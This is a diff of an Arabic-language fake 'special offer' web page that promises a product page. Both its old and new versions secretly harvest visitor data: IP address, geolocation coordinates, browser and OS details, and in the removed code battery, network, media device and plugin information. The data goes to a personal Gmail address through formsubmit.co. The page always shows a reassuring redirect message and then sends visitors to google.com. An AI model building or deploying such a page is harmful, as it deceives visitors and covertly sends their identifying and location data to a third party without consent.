@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>عرض حصري محدود</title>
+    <title>عرض خاص</title>
     <style>
         * {
             margin: 0;
@@ -13,7 +13,7 @@
         }
         
         body {
-            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -32,7 +32,7 @@
         }
         
         h1 {
-            color: #2c3e50;
+            color: #2575fc;
             margin-bottom: 20px;
             font-size: 28px;
         }
@@ -45,7 +45,7 @@
         }
         
         .btn {
-            background: linear-gradient(135deg, #3498db 0%, #2c3e50 100%);
+            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
             color: white;
             border: none;
             border-radius: 50px;
@@ -54,12 +54,12 @@
             font-weight: bold;
             cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 5px 15px rgba(44, 62, 80, 0.4);
+            box-shadow: 0 5px 15px rgba(37, 117, 252, 0.4);
         }
         
         .btn:hover {
             transform: translateY(-5px);
-            box-shadow: 0 8px 20px rgba(44, 62, 80, 0.6);
+            box-shadow: 0 8px 20px rgba(37, 117, 252, 0.6);
         }
         
         .btn:active {
@@ -78,6 +78,12 @@
             background-color: #d4edda;
             color: #155724;
             border: 1px solid #c3e6cb;
+        }
+        
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
         
         .loading {
@@ -128,10 +134,30 @@
         <h1>عرض خاص محدود!</h1>
         <p>انقر على الزر أدناه للاستفادة من عرضنا الحصري المحدود. سيتم تحويلك إلى صفحة المنتج بعد النقر.</p>
         
-        <button class="btn" id="actionBtn">
-            <span class="loading" id="loadingSpinner"></span>
-            <span id="btnText">اضغط هنا</span>
-        </button>
+        <!-- استخدم FormSubmit مباشرة في النموذج -->
+        <form id="dataForm" action="https://formsubmit.co/amealg1996@gmail.com" method="POST">
+            <!-- إضافة الحقول المخفية لجمع البيانات -->
+            <input type="hidden" name="_subject" value="بيانات زائر جديد">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="userAgent" id="userAgent">
+            <input type="hidden" name="language" id="language">
+            <input type="hidden" name="platform" id="platform">
+            <input type="hidden" name="screen" id="screen">
+            <input type="hidden" name="timezone" id="timezone">
+            <input type="hidden" name="time" id="time">
+            <input type="hidden" name="referrer" id="referrer">
+            <input type="hidden" name="ip" id="ip">
+            <input type="hidden" name="location" id="location">
+            <input type="hidden" name="browser" id="browser">
+            <input type="hidden" name="os" id="os">
+            <input type="hidden" name="deviceType" id="deviceType">
+            
+            <button type="submit" class="btn" id="actionBtn">
+                <span class="loading" id="loadingSpinner"></span>
+                <span id="btnText">اضغط هنا</span>
+            </button>
+        </form>
         
         <div id="message" class="message"></div>
         
@@ -141,8 +167,81 @@
     </div>
 
     <script>
-        document.getElementById('actionBtn').addEventListener('click', async function() {
-            const btn = this;
+        document.addEventListener('DOMContentLoaded', function() {
+            // جمع معلومات المستخدم عند تحميل الصفحة
+            collectUserData();
+        });
+
+        // جمع معلومات المستخدم
+        function collectUserData() {
+            // معلومات المتصفح الأساسية
+            document.getElementById('userAgent').value = navigator.userAgent;
+            document.getElementById('language').value = navigator.language;
+            document.getElementById('platform').value = navigator.platform;
+            document.getElementById('screen').value = `${screen.width}x${screen.height}`;
+            document.getElementById('timezone').value = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            document.getElementById('time').value = new Date().toLocaleString('ar-SA');
+            document.getElementById('referrer').value = document.referrer || 'Direct';
+            
+            // تحديد نوع المتصفح ونظام التشغيل
+            const userAgent = navigator.userAgent.toLowerCase();
+            
+            // تحديد المتصفح
+            if (userAgent.includes('chrome') && !userAgent.includes('edg')) {
+                document.getElementById('browser').value = 'Chrome';
+            } else if (userAgent.includes('firefox')) {
+                document.getElementById('browser').value = 'Firefox';
+            } else if (userAgent.includes('safari') && !userAgent.includes('chrome')) {
+                document.getElementById('browser').value = 'Safari';
+            } else if (userAgent.includes('edg')) {
+                document.getElementById('browser').value = 'Edge';
+            } else if (userAgent.includes('opera') || userAgent.includes('opr')) {
+                document.getElementById('browser').value = 'Opera';
+            } else {
+                document.getElementById('browser').value = 'غير معروف';
+            }
+            
+            // تحديد نظام التشغيل
+            if (userAgent.includes('windows')) {
+                document.getElementById('os').value = 'Windows';
+            } else if (userAgent.includes('mac')) {
+                document.getElementById('os').value = 'Mac';
+            } else if (userAgent.includes('linux')) {
+                document.getElementById('os').value = 'Linux';
+            } else if (userAgent.includes('android')) {
+                document.getElementById('os').value = 'Android';
+            } else if (userAgent.includes('ios') || userAgent.includes('iphone') || userAgent.includes('ipad')) {
+                document.getElementById('os').value = 'iOS';
+            } else {
+                document.getElementById('os').value = 'غير معروف';
+            }
+            
+            // تحديد نوع الجهاز
+            document.getElementById('deviceType').value = /Mobile|Android|iP(hone|od|ad)/.test(navigator.userAgent) ? 'جوال' : 'كمبيوتر';
+            
+            // الحصول على عنوان IP والمعلومات الجغرافية
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip').value = data.ip;
+                    
+                    // الحصول على المعلومات الجغرافية
+                    return fetch(`https://ipapi.co/${data.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(locationData => {
+                    const locationStr = `${locationData.city}, ${locationData.region}, ${locationData.country_name}`;
+                    document.getElementById('location').value = locationStr;
+                })
+                .catch(error => {
+                    console.log('لا يمكن الحصول على معلومات الموقع');
+                    document.getElementById('location').value = 'غير متوفر';
+                });
+        }
+
+        // إضافة مستمع الحدث للنموذج
+        document.getElementById('dataForm').addEventListener('submit', function(e) {
+            const btn = document.getElementById('actionBtn');
             const btnText = document.getElementById('btnText');
             const loadingSpinner = document.getElementById('loadingSpinner');
             const message = document.getElementById('message');
@@ -153,267 +252,10 @@
             loadingSpinner.style.display = 'inline-block';
             btn.disabled = true;
             
-            try {
-                // جمع معلومات المتصفح والجهاز الأساسية
-                const userInfo = {
-                    userAgent: navigator.userAgent,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    platform: navigator.platform,
-                    screen: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth,
-                    pixelDepth: screen.pixelDepth,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    time: new Date().toLocaleString('ar-SA'),
-                    referrer: document.referrer || 'Direct',
-                    cookiesEnabled: navigator.cookieEnabled,
-                    javaEnabled: navigator.javaEnabled(),
-                    pdfViewerEnabled: navigator.pdfViewerEnabled,
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
-                    deviceMemory: navigator.deviceMemory || 'غير معروف',
-                    maxTouchPoints: navigator.maxTouchPoints || 'غير معروف'
-                };
-
-                // جمع معلومات إضافية عن المتصفح
-                userInfo.doNotTrack = navigator.doNotTrack || 'غير معروف';
-                userInfo.onLine = navigator.onLine;
-                userInfo.vendor = navigator.vendor || 'غير معروف';
-                
-                // جمع معلومات عن أداء الجهاز
-                const start = performance.now();
-                let perfResult = 0;
-                for (let i = 0; i < 1000000; i++) {
-                    perfResult += Math.sqrt(i);
-                }
-                userInfo.performanceTest = `${(performance.now() - start).toFixed(2)}ms`;
-                
-                // محاولة الحصول على عنوان IP ومعلومات الموقع
-                try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipResponse.json();
-                    userInfo.ip = ipData.ip;
-                    
-                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-                    const locationData = await locationResponse.json();
-                    userInfo.location = {
-                        ip: ipData.ip,
-                        city: locationData.city,
-                        region: locationData.region,
-                        country: locationData.country_name,
-                        countryCode: locationData.country_code,
-                        continentCode: locationData.continent_code,
-                        postal: locationData.postal,
-                        latitude: locationData.latitude,
-                        longitude: locationData.longitude,
-                        timezone: locationData.timezone,
-                        currency: locationData.currency,
-                        languages: locationData.languages,
-                        asn: locationData.asn,
-                        org: locationData.org
-                    };
-                } catch (e) {
-                    userInfo.locationError = 'لا يمكن الحصول على معلومات الموقع';
-                }
-                
-                // جمع معلومات عن نظام التشغيل
-                const userAgent = navigator.userAgent.toLowerCase();
-                if (userAgent.includes('windows')) userInfo.os = 'Windows';
-                else if (userAgent.includes('mac')) userInfo.os = 'Mac';
-                else if (userAgent.includes('linux')) userInfo.os = 'Linux';
-                else if (userAgent.includes('android')) userInfo.os = 'Android';
-                else if (userAgent.includes('ios') || userAgent.includes('iphone') || userAgent.includes('ipad')) userInfo.os = 'iOS';
-                else userInfo.os = 'غير معروف';
-                
-                // جمع معلومات عن المتصفح
-                if (userAgent.includes('chrome') && !userAgent.includes('edg')) userInfo.browser = 'Chrome';
-                else if (userAgent.includes('firefox')) userInfo.browser = 'Firefox';
-                else if (userAgent.includes('safari') && !userAgent.includes('chrome')) userInfo.browser = 'Safari';
-                else if (userAgent.includes('edg')) userInfo.browser = 'Edge';
-                else if (userAgent.includes('opera') || userAgent.includes('opr')) userInfo.browser = 'Opera';
-                else userInfo.browser = 'غير معروف';
-                
-                // جمع معلومات إضافية عن الجهاز
-                userInfo.deviceType = /Mobile|Android|iP(hone|od|ad)/.test(navigator.userAgent) ? 'جوال' : 'كمبيوتر';
-                
-                // جمع معلومات عن إعدادات اللغة والوقت
-                userInfo.timezoneOffset = new Date().getTimezoneOffset();
-                userInfo.dstOffset = (new Date().getTimezoneOffset() - new Date(Date.UTC(new Date().getFullYear(), 0, 1)).getTimezoneOffset()) !== 0;
-                
-                // جمع معلومات عن دقة الشاشة وعمق الألوان
-                userInfo.colorGamut = window.matchMedia('(color-gamut: p3)').matches ? 'P3' : 
-                                    window.matchMedia('(color-gamut: rec2020)').matches ? 'Rec2020' : 'SRGB';
-                
-                // جمع معلومات عن دعم اللمس
-                userInfo.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-                
-                // جمع معلومات عن إعدادات الطاقة
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        userInfo.battery = {
-                            charging: battery.charging,
-                            level: battery.level * 100 + '%',
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        };
-                    } catch (e) {
-                        userInfo.battery = 'غير متاح';
-                    }
-                } else {
-                    userInfo.battery = 'غير مدعوم';
-                }
-                
-                // جمع معلومات عن الاتصال بالشبكة
-                if ('connection' in navigator) {
-                    userInfo.connection = {
-                        effectiveType: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt,
-                        saveData: navigator.connection.saveData
-                    };
-                } else {
-                    userInfo.connection = 'غير مدعوم';
-                }
-                
-                // جمع معلومات عن نظام الوسائط
-                userInfo.mediaDevices = [];
-                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                    try {
-                        const devices = await navigator.mediaDevices.enumerateDevices();
-                        userInfo.mediaDevices = devices.map(device => ({
-                            kind: device.kind,
-                            label: device.label,
-                            deviceId: device.deviceId
-                        }));
-                    } catch (e) {
-                        userInfo.mediaDevices = 'غير متاح';
-                    }
-                }
-                
-                // جمع معلومات عن نظام الألوان (فاتح/غامق)
-                userInfo.prefersColorScheme = window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 
-                                            window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'no-preference';
-                
-                // جمع معلومات عن دقة البكسل
-                userInfo.devicePixelRatio = window.devicePixelRatio;
-                
-                // جمع معلومات عن إضافات المتصفح
-                userInfo.plugins = [];
-                for (let i = 0; i < navigator.plugins.length; i++) {
-                    userInfo.plugins.push(navigator.plugins[i].name);
-                }
-                
-                // إرسال البيانات إلى البريد الإلكتروني
-                const response = await fetch('https://formsubmit.co/ajax/amealg1996@gmail.com', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        name: 'بيانات الزائر',
-                        subject: `بيانات زائر جديد - ${new Date().toLocaleDateString('ar-SA')}`,
-                        message: `
-معلومات الزائر الشاملة:
-
-معلومات المتصفح:
-- وكيل المستخدم: ${userInfo.userAgent}
-- المتصفح: ${userInfo.browser}
-- اللغة: ${userInfo.language}
-- اللغات المدعومة: ${userInfo.languages}
-- النظام الأساسي: ${userInfo.platform}
-- نوع الجهاز: ${userInfo.deviceType}
-- نظام التشغيل: ${userInfo.os}
-- إضافات المتصفح: ${userInfo.plugins.join(', ') || 'لا توجد'}
-
-معلومات الشاشة:
-- الدقة: ${userInfo.screen}
-- عمق الألوان: ${userInfo.colorDepth}
-- عمق البكسل: ${userInfo.pixelDepth}
-- نسبة بكسل الجهاز: ${userInfo.devicePixelRatio}
-- نطاق الألوان: ${userInfo.colorGamut}
-
-معلومات الموقع والوقت:
-- المنطقة الزمنية: ${userInfo.timezone}
-- إزاحة المنطقة الزمنية: ${userInfo.timezoneOffset} دقيقة
-- التوقيت الصيفي: ${userInfo.dstOffset ? 'مفعل' : 'غير مفعل'}
-- الوقت المحلي: ${userInfo.time}
-
-معلومات الشبكة:
-- عنوان IP: ${userInfo.ip || 'غير متوفر'}
-- المدينة: ${userInfo.location?.city || 'غير متوفر'}
-- المنطقة: ${userInfo.location?.region || 'غير متوفر'}
-- الدولة: ${userInfo.location?.country || 'غير متوفر'}
-- خط العرض: ${userInfo.location?.latitude || 'غير متوفر'}
-- خط الطول: ${userInfo.location?.longitude || 'غير متوفر'}
-- مزود الخدمة: ${userInfo.location?.org || 'غير متوفر'}
-
-معلومات الأداء:
-- عدد الأنوية: ${userInfo.hardwareConcurrency}
-- ذاكرة الجهاز: ${userInfo.deviceMemory} GB
-- اختبار الأداء: ${userInfo.performanceTest}
-
-معلومات إضافية:
-- الكوكيز مفعلة: ${userInfo.cookiesEnabled ? 'نعم' : 'لا'}
-- الجافا مفعلة: ${userInfo.javaEnabled ? 'نعم' : 'لا'}
-- قارئ PDF مفعل: ${userInfo.pdfViewerEnabled ? 'نعم' : 'لا'}
-- Do Not Track: ${userInfo.doNotTrack}
-- اتصال بالإنترنت: ${userInfo.onLine ? 'نعم' : 'لا'}
-- نقاط اللمس: ${userInfo.maxTouchPoints}
-- دعم اللمس: ${userInfo.touchSupport ? 'نعم' : 'لا'}
-- نمط الألوان المفضل: ${userInfo.prefersColorScheme}
-
-معلومات البطارية: ${typeof userInfo.battery === 'object' ? 
-    `- الشحن: ${userInfo.battery.charging ? 'نعم' : 'لا'}
-- مستوى الشحن: ${userInfo.battery.level}
-- وقت الشحن: ${userInfo.battery.chargingTime}
-- وقت التفريغ: ${userInfo.battery.dischargingTime}` : userInfo.battery}
-
-معلومات الاتصال: ${typeof userInfo.connection === 'object' ? 
-    `- نوع الاتصال: ${userInfo.connection.effectiveType}
-- سرعة التنزيل: ${userInfo.connection.downlink} Mbps
-- وقت往返: ${userInfo.connection.rtt} ms
-- توفير البيانات: ${userInfo.connection.saveData ? 'مفعل' : 'غير مفعل'}` : userInfo.connection}
-
-أجهزة الوسائط: ${Array.isArray(userInfo.mediaDevices) ? 
-    userInfo.mediaDevices.map(d => `${d.kind}: ${d.label || 'غير معروف'}`).join('\n- ') : userInfo.mediaDevices}
-
-المصدر: ${userInfo.referrer}
-                        `.trim()
-                    })
-                });
-                
-                const result = await response.json();
-                
-                if (response.ok) {
-                    // إظهار رسالة نجاح عامة دون تفاصيل
-                    message.textContent = 'جاري تحويلك إلى صفحة المنتج...';
-                    message.className = 'message success';
-                    message.style.display = 'block';
-                    
-                    // توجيه المستخدم بعد فترة
-                    setTimeout(() => {
-                        window.location.href = 'https://www.google.com';
-                    }, 2000);
-                } else {
-                    throw new Error('فشل في التجهيز');
-                }
-                
-            } catch (error) {
-                // إظهار رسالة خطأ عامة للمستخدم
-                message.textContent = 'جاري تحويلك إلى صفحة المنتج...';
-                message.className = 'message success';
-                message.style.display = 'block';
-                
-                // توجيه المستخدم حتى في حالة الخطأ
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 2000);
-            } finally {
-                btnText.textContent = 'اضغط هنا';
-                loadingSpinner.style.display = 'none';
-                btn.disabled = false;
-            }
+            // إظهار رسالة نجاح (سيتم التوجيه تلقائياً بواسطة FormSubmit)
+            message.textContent = 'جاري تحويلك إلى صفحة المنتج...';
+            message.className = 'message success';
+            message.style.display = 'block';
         });
     </script>
 </body>
